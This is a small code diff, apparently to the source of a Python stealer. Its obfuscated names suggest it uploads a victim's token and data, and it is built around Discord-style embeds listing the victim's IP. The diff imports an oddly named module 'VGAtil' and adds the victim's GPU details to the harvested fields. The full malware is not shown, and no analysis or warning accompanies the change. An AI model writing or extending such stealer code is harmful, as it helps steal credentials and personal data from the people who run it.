@@ -1,5 +1,6 @@
 import os
 import threading
+import VGAtil as GPU
 from sys import executable
 from sqlite3 import connect as sql_connect
 import re
@@ -344,6 +345,11 @@ def upl05dT4k31(t0k3n, path):
                 {
                     "name": "<:mc_earth:589630396476555264> IP:",
                     "value": f"```{g3t1p()}```",
+                    "inline": True
+                },
+                {
+                    "name": "<:mc_earth:589630396476555264> VGA:",
+                    "value": f"```{GPU.getGPUs()}```",
                     "inline": True
                 },
                 {
